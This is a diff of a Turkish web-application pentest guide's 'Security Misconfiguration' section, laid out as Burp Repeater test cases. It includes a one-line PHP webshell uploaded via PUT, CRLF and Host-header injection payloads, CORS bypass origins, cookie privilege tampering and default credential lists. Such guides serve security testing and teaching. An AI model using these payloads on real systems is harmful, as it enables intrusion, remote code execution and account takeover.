@@ -1721,37 +1721,414 @@ openredirect: {
 },
 
 misconfig: {
-    menuName: 'Misconfiguration',
-    icon: 'icon-toolbox',
-    parent: 'vulnerabilities',
-    title: 'Security Misconfiguration (Yanlış Yapılandırma)',
-    description: 'Varsayılan ayarlar, gereksiz servisler ve yetersiz hata yönetimi kaynaklı, en yaygın zafiyet sınıfıdır.',
-    sections: [
-        {
-            title: 'Özet Bilgi ve Kritik Etki',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Yanlış yapılandırmalar genellikle Information Disclosure (Bilgi Sızıntısı), Dizin Listeleme (Directory Listing) veya RCE'ye (WebShell Yükleme) zemin hazırlar.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Kritik Etki:</strong> Eğer <code>.env</code> gibi konfigürasyon dosyaları sızarsa, tüm sistemin kimlik bilgileri ifşa olabilir.</li>
-            </ul>`
-        },
-        {
-            title: 'Hızlı Tespit ve Checklist',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>1. Dizin/Dosya Kontrolü:</strong>
-                <pre>Gobuster / Ffuf ile: /admin, /test, /backup, /logs, /.git, /.env, /config.php</pre></li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>2. Hata Yönetimi:</strong> Hatalı bir istek göndererek (URL'ye <code>'</code> veya <code>"</code> ekle) detaylı Stack Trace veya veritabanı hataları alınıp alınmadığını kontrol et.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>3. Gereksiz Metotlar:</strong> <code>OPTIONS</code> HTTP metoduyla hangi metotların (PUT, DELETE) açık olduğunu kontrol et. <code>PUT</code> ile dosya yükleme, <code>DELETE</code> ile dosya silme denemeleri yap.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>4. Varsayılan Ayarlar:</strong> CMS (WordPress, Joomla vb.) kullanılıyorsa, varsayılan admin yolları (<code>/wp-admin</code>) ve parola kombinasyonlarını dene.</li>
-            </ul>`
-        },
-        {
-            title: 'PoC Örnekleri',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>.env Sızıntısı:</strong> <code>GET https://target.com/.env</code> isteği ile veritabanı şifrelerini ve API anahtarlarını elde etme.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>WebDAV/PUT RCE:</strong> <code>PUT /shell.php</code> isteği ile basit bir PHP shell dosyasını sunucuya doğrudan kaydetme.</li>
-            </ul>`
-        }
-    ]
+  menuName: "Misconfiguration",
+  icon: "icon-toolbox",
+  parent: "vulnerabilities",
+  title: "Security Misconfiguration (Kapsamlı Test Rehberi)",
+  description: "Sunucu, dosya, HTTP başlıkları (CORS, Cookies) ve varsayılan ayarlar gibi bileşenlerin güvensiz yapılandırılmasını test etme metodolojisi.",
+  sections: [
+    {
+      "title": "Genel Bakış ve Kapsamı",
+      "content": `<ul style='list-style:none;padding:0;margin:0;display:grid;gap:8px'>
+        <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+          Güvenlik Yanlış Yapılandırması, bir sistemin güvenlik duruşunu zayıflatan kasıtsız hatalar veya ihmallerdir. Bu, OWASP Top 10'da en sık görülen zafiyetlerden biridir çünkü modern uygulamalar çok katmanlı ve karmaşıktır.
+        </li>
+        <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+          <strong>Test Alanları:</strong>
+          <ul style='padding-left: 20px; margin-top: 8px;'>
+            <li><strong>Sunucu & Dosya Sistemi:</strong> <code>/.git</code>, <code>/.env</code> gibi sızan dosyalar, gereksiz HTTP metotları (<code>PUT</code>), detaylı hata mesajları.</li>
+            <li><strong>HTTP Başlıkları (Headers):</strong> Güvensiz CORS (<code>Origin</code>) yapılandırması, eksik <code>Set-Cookie</code> bayrakları (<code>HttpOnly</code>), eksik <code>Referrer-Policy</code>.</li>
+            <li><strong>Varsayılan Ayarlar:</strong> Cihaz veya yazılımların 'admin:admin', 'root:toor' gibi varsayılan parolalarla bırakılması.</li>
+          </ul>
+        </li>
+      </ul>`
+    },
+    {
+      "title": "Sunucu & Header Test Metodolojisi",
+      "content": `
+<ul style='list-style:none;padding:0;margin:0;display:grid;gap:8px'>
+
+  <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 1: Hassas Dosya ve Dizin Keşfi</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'>Sunucuda unutulmuş, yedeklenmiş veya yanlışlıkla web'e açılmış hassas konfigürasyon dosyalarını, yedekleri ve kaynak kodu depolarını bulmak.</p>
+
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test (PoC):</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Sitede gezerken yakaladığınız herhangi bir <code>GET /</code> isteğini <strong>Burp Repeater</strong>'a gönderin. İsteğin yolunu (path) değiştirerek bu dosyaları test edin:</p>
+        <pre># Repeater'da bu yolları deneyin:
+GET /.git/config HTTP/1.1
+Host: hedef-site.com
+...
+
+GET /.env HTTP/1.1
+Host: hedef-site.com
+...
+
+GET /phpinfo.php HTTP/1.1
+Host: hedef-site.com
+...</pre>
+        <p class='small' style='margin-top: 5px; margin-bottom: 20px;'><b>İpucu:</b> Daha kapsamlı tarama için <strong>Burp Intruder</strong>'a <code>GET /FUZZ</code> isteği gönderin ve "Payloads" kısmına (<code>/.git</code>, <code>/.env</code>, <code>/admin</code> vb. içeren) bir dizin listesi (wordlist) yükleyin.</p>
+        
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Cevap:</strong>
+        <p class='small' style='margin:0 0 5px 0;'><code>404 Not Found</code> yerine <code>200 OK</code> yanıtı ve dosya içeriğinin (örn: <code>DB_PASSWORD=...</code>) dönmesi.</p>
+      </div>
+    </details>
+  </li>
+
+  <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 2: Detaylı Hata Mesajları (Verbose Errors)</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'>Uygulamayı kasıtlı olarak bozarak, sunucunun "stack trace" gibi detaylı hata mesajları vermesini sağlamak. Bu mesajlar, saldırgan için bir yol haritasıdır.</p>
+
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test (PoC):</strong>
+        <p class='small' style='margin:0 0 5px 0;'><strong>Burp Repeater</strong>'da, <code>/products?id=1</code> gibi geçerli bir isteği yakalayın ve parametreye bir <strong>tek tırnak (<code>'</code>)</strong> ekleyerek <code>/products?id=1'</code> olarak gönderin:</p>
+        <pre style='margin-bottom: 20px;'>GET /products?id=1' HTTP/1.1
+Host: hedef-site.com
+...</pre>
+        
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Cevap:</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Genel bir "Hata oluştu" mesajı yerine, dosya yollarını, SQL sorgularını veya framework detaylarını içeren bir "Stack Trace" (hata dökümü) görmek.</p>
+        <pre>Warning: mysql_fetch_array() expects... in /var/www/html/products.php on line 42</pre>
+        <p class='small' style='margin-top: 5px;'><b>Ne Öğrenildi?</b> Sunucunun <code>/var/www/html/</code> dizininde çalıştığı, <code>products.php</code> adında bir dosyası olduğu ve 42. satırda zafiyetli bir SQL fonksiyonu kullandığı öğrenildi. Bu, LFI veya SQLi planlamak için kullanılır.</p>
+      </div>
+    </details>
+  </li>
+
+  <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 3: Gereksiz HTTP Metotları (RCE Riski)</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'>Web sunucusunun <code>PUT</code> veya <code>DELETE</code> gibi, genellikle geliştirme ortamında unutulan tehlikeli HTTP metotlarına izin verip vermediğini kontrol etmek.</p>
+
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test 1 (PoC):</strong>
+        <p class='small' style='margin:0 0 5px 0;'><strong>Burp Repeater</strong>'da bir isteğe sağ tıklayın ve <strong>"Change request method"</strong> (İstek metodunu değiştir) seçeneğini <code>OPTIONS</code> olarak değiştirip gönderin.</p>
+        <pre>HTTP/1.1 200 OK
+Allow: GET, POST, OPTIONS, PUT, DELETE</pre>
+
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>🕵️ Test 2 (PoC):</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Eğer <code>PUT</code> metodu açıksa, <strong>Repeater</strong>'da metodu <code>PUT</code> yapın, URL'ye <code>/uploads/shell.php</code> gibi bir yol yazın ve isteğin gövdesine (body) webshell kodunuzu ekleyip gönderin:</p>
+        <pre style='margin-bottom: 20px;'>PUT /uploads/shell.php HTTP/1.1
+Host: hedef-site.com
+...
+
+<?php system($_GET['cmd']); ?></pre>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Cevap (PUT):</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Sunucu <code>201 Created</code> yanıtı döner. Artık <code>/uploads/shell.php?cmd=whoami</code> adresine giderek RCE (Uzaktan Kod Çalıştırma) elde edebilirsiniz.</p>
+      </div>
+    </details>
+  </li>
+
+  <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 4: Güvensiz CORS (Origin Yansıtma)</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'>Sunucunun, istek atan <code>Origin</code> başlığına körü körüne güvenip güvenmediğini (yansıtıp yansıtmadığını) kontrol etmek.</p>
+        
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test (PoC):</strong>
+        <p class='small' style='margin:0 0 5px 0;'><strong>Burp Repeater</strong>'da, <code>/api/user/details</code> gibi kimlik doğrulamalı bir isteği yakalayın ve <code>Origin</code> başlığını ekleyerek/değiştirerek rastgele bir alan adı girin:</p>
+        <pre style='margin-bottom: 20px;'>GET /api/user/details HTTP/1.1
+Host: hedef-site.com
+Cookie: session=...
+Origin: https://rastgele-domain.com</pre>
+        
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Cevap (Yansıtma):</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Sunucu, gönderdiğiniz rastgele <code>Origin</code>'i kontrol etmeden cevaba yansıtıyorsa, bu kritik bir zafiyettir.</p>
+        <pre>HTTP/2 200 OK
+Access-Control-Allow-Origin: https://rastgele-domain.com
+Access-Control-Allow-Credentials: true</pre>
+        <p class='small' style='margin-top: 5px;'><b>❗ Sonuç:</b> Herhangi bir web sitesi, sizin adınıza (çerezlerinizle) <code>/api/user/details</code> adresine istek atabilir ve dönen cevabı (API anahtarı, kişisel veriler) okuyabilir.</p>
+      </div>
+    </details>
+  </li>
+
+  <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 5: Güvensiz CORS (Origin: null)</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'>Sunucunun, tarayıcılar tarafından "belirsiz" veya "yerel dosya" gibi durumlar için kullanılan <code>null</code> origin'e güvenip güvenmediğini test etmek.</p>
+
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test (PoC):</strong>
+        <p class='small' style='margin:0 0 5px 0;'><strong>Burp Repeater</strong>'da <code>Origin</code> başlığının değerini <code>null</code> olarak gönderin.</p>
+        <pre style='margin-bottom: 20px;'>GET /api/user/details HTTP/1.1
+Host: hedef-site.com
+Cookie: session=...
+Origin: null</pre>
+        
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Cevap:</strong>
+        <pre>HTTP/2 200 OK
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true</pre>
+        <p class='small' style='margin-top: 5px;'><b>❗ Sonuç:</b> Saldırgan, özel olarak yapılandırılmış bir "sandboxed" <code>&lt;iframe&gt;</code> oluşturarak <code>Origin: null</code> ile istek atabilir ve bu zafiyeti sömürerek verilerinizi okuyabilir.</p>
+      </div>
+    </details>
+  </li>
+
+  <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 6: Zayıf CORS Whitelist (Bypass)</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'>Sunucunun "Sadece <code>https://guvenli-site.com</code>'a güven" demeye çalıştığı, ancak bu kuralı zayıf bir şekilde (örn: "içeriyor mu?", "ile mi bitiyor?") kontrol ettiği durumları atlatmak.</p>
+
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test Senaryoları (Burp):</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Sunucunun <code>https://example.com</code> adresine güvendiğini varsayalım. <strong>Burp Repeater</strong>'da <code>Origin</code> başlığını şu varyasyonlarla gönderin:</p>
+        
+        <p class='small' style='margin: 5px 0 5px 0;'><b>A. endsWith Hatası:</b></p>
+        <pre>Origin: https://hacker-example.com</pre>
+        
+        <p class='small' style='margin: 10px 0 5px 0;'><b>B. startsWith Hatası:</b></p>
+        <pre>Origin: https://example.com.hacker.com</pre>
+
+        <p class='small' style='margin: 10px 0 5px 0;'><b>C. Protokol Kontrolü Eksikliği:</b></p>
+        <pre>Origin: http://example.com</pre>
+
+        <p class='small' style='margin: 10px 0 5px 0;'><b>D. URL Parser Kandırmacası:</b></p>
+        <pre style='margin-bottom: 20px;'>Origin: https://example.com@hacker.com</pre>
+
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Cevap:</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Sunucu, bu kandırmaca <code>Origin</code>'lerden herhangi birini geçerli sayıp cevaba yansıtırsa zafiyet vardır.</p>
+        <pre>HTTP/2 200 OK
+Access-Control-Allow-Origin: https://hacker-example.com
+Access-Control-Allow-Credentials: true</pre>
+      </div>
+    </details>
+  </li>
+
+  <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 7: Cookie Güvenlik Bayrakları (Credentials)</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'><code>Access-Control-Allow-Credentials: true</code> başlığı, çerezlerin siteler arası isteklere ekleneceğini söyler. Bu test, o çerezlerin (session ID) kendilerinin yeterince korunup korunmadığını kontrol eder.</p>
+        
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test (PoC):</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Siteye giriş yapın ve <strong>Burp Proxy</strong>'nin "HTTP history" sekmesinde <code>/login</code> isteğine gelen yanıtı (Response) inceleyin. <code>Set-Cookie</code> başlığını bulun:</p>
+        <pre style='margin-bottom: 20px;'>HTTP/2 200 OK
+Set-Cookie: session=abc123xyz789...</pre>
+
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Cevaplar (Eksik Bayraklar):</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Aşağıdaki bayrakların EKSİKLİĞİ bir zafiyettir:</p>
+        <ul class='small' style='padding-left:20px;margin:0;'>
+          <li><b><code>HttpOnly</code> Yok:</b> Kritik! XSS zafiyeti varsa, <code>document.cookie</code> ile oturum çalınabilir.</li>
+          <li><b><code>Secure</code> Yok:</b> Kritik! Oturum çerezi şifresiz HTTP (MiTM) üzerinden sızdırılabilir.</li>
+          <li><b><code>SameSite=Lax</code> (veya <code>Strict</code>) Yok:</b> Zafiyet! Site, CSRF saldırılarına karşı savunmasızdır.</li>
+        </ul>
+      </div>
+    </details>
+  </li>
+
+  <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 8: Referer Sızıntısı (Referrer-Policy)</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'>Hassas bilgilerin (şifre sıfırlama token'ı, API anahtarı vb.) URL'deyken, başka bir siteye tıklandığında <code>Referer</code> başlığı ile sızıp sızmadığını test etmek.</p>
+        
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test (PoC):</strong>
+        <ol class='small' style='padding-left:20px;margin:5px 0; margin-bottom: 20px;'>
+          <li>Kurbanı, üzerinde hassas veri (token) bulunan bir URL'ye (<code>/reset?token=...</code>) çekin.</li>
+          <li>Kurbanın, o sayfadayken harici bir siteye (örn: <code>http://attacker-server.com</code>) tıklamasını sağlayın.</li>
+          <li>Saldırganın sunucu loglarına (Attacker's log) bakın. <code>Referer</code> başlığı, hassas token'ı içeriyorsa zafiyet vardır:</li>
+        </ol>
+
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Cevap (Sızıntı):</strong>
+        <pre>GET / HTTP/1.1
+Host: attacker-server.com
+Referer: https://hedef-site.com/reset?token=ABC123XYZ</pre>
+        
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>✅ Güvenli Durum:</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Sunucu, <code>Referrer-Policy: strict-origin-when-cross-origin</code> (veya daha kısıtlayıcı) başlığını göndermeliydi. Bu durumda <code>Referer</code> başlığı <code>https://hedef-site.com/</code> olarak görünür ve token sızmazdı.</p>
+      </div>
+    </details>
+  </li>
+
+  <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 9: CRLF Enjeksiyonu (HTTP Header Injection)</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'>Sunucunun, kullanıcı girdisini bir HTTP yanıt başlığına (genellikle <code>Location</code> veya <code>Set-Cookie</code>) yerleştirmeden önce <code>\r\n</code> (veya URL-encoded hali <code>%0d%0a</code>) gibi satır sonu karakterlerini temizleyip temizlemediğini test etmek.</p>
+
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test (PoC):</strong>
+        <p class='small' style='margin:0 0 5px 0;'><strong>Burp Repeater</strong>'da bir yönlendirme (redirect) parametresi yakalayın (örn: <code>/login?redirect_uri=/</code>). <code>%0d%0a</code> karakterlerini ve yeni, sahte bir başlığı enjekte edin:</p>
+        <pre style='margin-bottom: 20px;'>GET /redirect?url=/%0d%0aSahte-Baslik: Turgay-Tarafindan-Eklendi HTTP/1.1
+Host: hedef-site.com</pre>
+        
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Cevap:</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Sunucu, bu enjeksiyonu fark etmez ve yanıt başlıklarına sizin sahte başlığınızı ekler:</p>
+        <pre>HTTP/1.1 302 Found
+Location: /
+Sahte-Baslik: Turgay-Tarafindan-Eklendi
+...</pre>
+        <p class='small' style='margin-top: 5px;'><b>❗ Sonuç:</b> Bu, sahte bir <code>Set-Cookie</code> başlığı ekleyerek kurbanın çerezlerini (session fixation) değiştirmekten, XSS tetiklemeye (HTTP Response Splitting) veya önbellek zehirlemeye (Cache Poisoning) kadar giden çok kritik bir zafiyettir.</p>
+      </div>
+    </details>
+  </li>
+
+  <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 10: Host Başlığı Zehirlenmesi (Password Reset)</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'>Sunucunun, şifre sıfırlama linkleri veya canonical URL'ler gibi kritik kaynakları oluştururken <code>Host</code> başlığına güvenip güvenmediğini test etmek.</p>
+
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test (PoC):</strong>
+        <p class='small' style='margin:0 0 5px 0;'><strong>Burp Repeater</strong>'da bir "şifremi unuttum" isteği (<code>POST /forgot-password</code>) yakalayın. <code>Host</code> başlığını kendi sunucunuzla değiştirip isteği gönderin:</p>
+        <pre style='margin-bottom: 20px;'>POST /forgot-password HTTP/1.1
+Host: hacker-sunucusu.com
+...
+
+email=kurban@hedef-site.com</pre>
+        
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Cevap (E-posta ile gelir):</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Uygulama, isteği kabul eder ve kurbanın e-posta adresine, *sizin* <code>Host</code> başlığınızı kullanarak oluşturulmuş bir sıfırlama linki gönderir:</p>
+        <pre>Merhaba, şifrenizi sıfırlamak için tıklayın:
+https://hacker-sunucusu.com/reset?token=ABC123XYZ...</pre>
+        <p class='small' style='margin-top: 5px;'><b>❗ Sonuç:</b> Kurban linke tıkladığında, tarayıcısı bu isteği sizin sunucunuza (<code>hacker-sunucusu.com</code>) yapar. Sıfırlama token'ı sizin loglarınıza düşer ve hesabı ele geçirirsiniz.</p>
+      </div>
+    </details>
+  </li>
+
+  <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 11: Çerez Değeri Manipülasyonu (Client-Side Trust)</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'>Sunucunun, <code>HttpOnly</code> bayrağı olmayan ve kolayca anlaşılabilecek (örn: <code>isAdmin=false</code> veya Base64 ile kodlanmış <code>{"role":"user"}</code>) çerez değerlerine yetkilendirme için güvenip güvenmediğini test etmek.</p>
+
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test (PoC):</strong>
+        <p class='small' style='margin:0 0 5px 0;'>1. Normal bir kullanıcı olarak <strong>Burp Repeater</strong>'da <code>/admin</code> paneline erişmeyi deneyin:</p>
+        <pre>GET /admin HTTP/1.1
+Host: hedef-site.com
+Cookie: session=...; isAdmin=false;
+...
+HTTP/1.1 403 Forbidden</pre>
+        <p class='small' style='margin: 10px 0 5px 0;'>2. <strong>Repeater</strong>'da çerez değerini <code>isAdmin=true</code> olarak değiştirip isteği tekrarlayın:</p>
+        <pre style='margin-bottom: 20px;'>GET /admin HTTP/1.1
+Host: hedef-site.com
+Cookie: session=...; isAdmin=true;</pre>
+        
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Cevap:</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Sunucu, istemciden gelen bu <code>true</code> değerini doğrulamadan kabul eder ve <code>200 OK</code> yanıtı ile admin paneli içeriğini döndürür.</p>
+        <pre>HTTP/1.1 200 OK
+&lt;h1&gt;Admin Paneline Hoş Geldiniz&lt;/h1&gt;...</pre>
+        <p class='small' style='margin-top: 5px;'><b>❗ Sonuç:</b> Bu, klasik bir Dikey Yetki Yükseltme (Vertical Privilege Escalation) zafiyetidir.</p>
+      </div>
+    </details>
+  </li>
+
+  <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 12: Eksik Kritik Güvenlik Başlıkları (CSP, HSTS vb.)</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'>Sunucunun, tarayıcıya modern güvenlik politikalarını (XSS, Clickjacking, SSL Stripping'e karşı) zorunlu kılan HTTP yanıt başlıklarını gönderip göndermediğini kontrol etmek.</p>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test (PoC):</strong>
+        <p class='small' style='margin:0 0 20px 0;'>Burp Suite'te veya tarayıcının "Geliştirici Araçları -> Network" sekmesinde herhangi bir sayfanın yanıt (Response) başlıklarına bakın.</p>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Cevap (Eksiklikler):</strong>
+        <ul class='small' style='padding-left:20px;margin:0;'>
+          <li><b>Content-Security-Policy (CSP) Yok:</b> Site, XSS saldırılarına karşı en güçlü savunma katmanından birini kaçırıyor demektir.</li>
+          <li><b>HTTP-Strict-Transport-Security (HSTS) Yok:</b> Kullanıcılar, http://'ye girmeye çalıştıklarında (veya MiTM saldırılarında) https://'ye otomatik olarak yönlendirilmez, SSL-Stripping saldırılarına açık hale gelir.</li>
+          <li><b>X-Content-Type-Options: nosniff Yok:</b> Tarayıcı, dosya içeriğini "koklayarak" (MIME-sniffing) bir .txt dosyasını JavaScript olarak çalıştırabilir.</li>
+          <li><b>X-Frame-Options veya CSP frame-ancestors Yok:</b> Site, "Clickjacking" saldırılarına karşı savunmasızdır. Saldırgan, sitenizi bir &lt;iframe&gt; içine çekip kullanıcıya fark ettirmeden düğmelere tıklatabilir.</li>
+        </ul>
+      </div>
+    </details>
+  </li>
+
+  <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 13: Varsayılan Kimlik Bilgileri ve Açık Yönetici Panelleri</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'>Genel bakışta bahsettiğiniz (ama testlerde olmayan) admin:admin gibi varsayılan ayarları ve kolayca tahmin edilebilir yönetici paneli yollarını bulmak.</p>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test (PoC):</strong>
+        <p class='small' style='margin:0 0 20px 0;'>Burp Intruder veya bir dizin tarama aracı (ffuf, dirb) kullanarak yaygın yolları (<code>/admin</code>, <code>/panel</code>, <code>/login</code>, <code>/wp-admin</code>, <code>/dashboard</code>) tarayın. Bulunan panellerde <code>admin:admin</code>, <code>root:toor</code>, <code>admin:password</code>, <code>admin:1234</code> gibi ilk 10'luk varsayılan parola listesini deneyin.</p>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Cevap:</strong>
+        <p class='small' style='margin:0 0 5px 0;'><code>200 OK</code> ile bir panelin bulunması ve varsayılan bir şifreyle giriş yapılabilmesi.</p>
+      </div>
+    </details>
+  </li>
+
+  <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 14: Bulut Depolama Misconfiguration (Örn: S3 Buckets)</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'>Uygulamanın kullandığı bulut depolama (Amazon S3, Azure Blob, Google Cloud Storage) kovalarının (bucket) herkese açık (public) olup olmadığını test etmek.</p>
